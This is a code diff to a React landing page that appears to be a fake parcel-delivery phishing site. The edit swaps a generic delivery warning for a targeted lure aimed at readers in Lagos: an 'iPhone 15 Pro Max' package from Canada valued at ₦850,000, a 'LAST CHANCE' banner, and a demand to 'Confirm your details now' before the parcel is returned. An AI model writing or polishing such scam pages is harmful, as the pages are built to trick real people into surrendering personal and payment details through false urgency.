@@ -16,11 +16,11 @@ const Index = () => {
         <div className="container mx-auto px-4">
           <div className="text-center mb-8">
             <h2 className="text-3xl font-bold text-logistics-navy mb-4 font-inter">
-              ⚠️ Final Delivery Attempt - Immediate Action Required
+              🚨 LAST CHANCE - Your iPhone 15 Pro Max Package from Canada!
             </h2>
             <p className="text-muted-foreground max-w-3xl mx-auto text-lg">
-              Your package has arrived at our local distribution center and is scheduled for final delivery today. 
-              <span className="font-semibold text-logistics-red"> Delivery confirmation is required within 24 hours</span> to prevent automatic return to sender.
+              Your expensive electronics package from Canada has arrived in Lagos! This is our 
+              <span className="font-semibold text-logistics-red"> FINAL delivery attempt. Confirm your details now</span> or this ₦850,000 package will go back to Canada tomorrow!
             </p>
           </div>
           
